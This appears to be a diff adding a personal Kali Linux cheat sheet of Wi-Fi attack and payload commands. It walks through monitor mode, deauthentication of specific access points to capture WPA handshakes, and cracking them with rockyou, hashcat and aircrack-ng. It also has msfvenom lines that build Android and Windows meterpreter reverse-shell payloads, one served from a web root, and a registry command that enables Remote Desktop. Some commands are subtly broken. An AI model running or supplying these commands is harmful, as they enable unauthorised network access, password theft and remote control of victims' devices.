@@ -1,0 +1,98 @@
+=========
+Commands for a new Kali
+=========
+sudo apt upgrade -y
+sudo apt dist-upgrade -y
+sudo reboot now
+sudo apt update
+sudo apt install realtek-rtl88xxau-dkms
+sudo apt install dkms
+git clone https://github.com/aircrack-ng/rtl8812au
+cd rtl8812au/
+make
+sudo make install
+lsusb
+iwconfig
+
+!To test:
+sudo wifite
+
+activate FernWifi Cracker
+-----------------
+sudo su
+airmon-ng
+ip link set wlan0 down
+ip link set wlan0 name wlan0mon
+
+
+chmod -R 777 /usr/lib/jvm/
+
+----------------------------------------------- HANDSHAKE
+
+sudo airodump-ng wlan0
+sudo airodump-ng wlan0 -d 02:23:08:D7:F6:BC
+2x fenster sudo aireplay-ng --deauth 0 -a 02:23:08:D7:F6:BC wlan0   
+sudo airodump-ng -w aufnahme1 -c 11 --bssid 34:81:C4:B1:35:A6 wlan0
+
+ls
+wireshark capture1.cap  -> EAPOL
+airmon-ng stop wlan0
+
+
+--------------
+
+
+
+
+
+
+wordlists
+-----------------
+cd /usr/share/wordlists
+ls
+sudo gzip -d rockyou.txt.gz
+ls
+	wc -l nmap.lst(how long)
+	grep cisco rockyou.txt(search for cisco)
+	grep -F 'dads' rockyou.txt
+	sudo grep -x '.\{8,63}' rockyou.txt > wpalang.txt
+	ls
+
+See info about WiFi
+-----------------------------
+sudo wifite --wpa --kill
+
+
+CONVERT NICEHASH
+--------------------
+
+sudo /usr/share/hashcat-utils/cap2hccapx.bin capture1-01.cap lastwpa2.hccapx
+
+C:\hashcat>hashcat.exe -m 2500 -a 3 lastw2.hccapx ?d?d?d?d?d?d?d?d
+
+
+FritzBox = 20 chars
+TPLink
+
+hashcat.net/wiki/doku.php?id=hashcat
+
+aircrack-ng hack2-03.cap -w /usr/share/wordlists/rockyou.txt       
+
+
+
+
+
+
+
+
+msfvenom -p android/meterpeter/reverse_tcp LHOST=192.168.130.136 LPORT=4444 R> /var/www/html/das.apk
+
+
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.100.4 LPORT=4444 -o /root/something32.exe
+
+
+
+
+reg add “HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
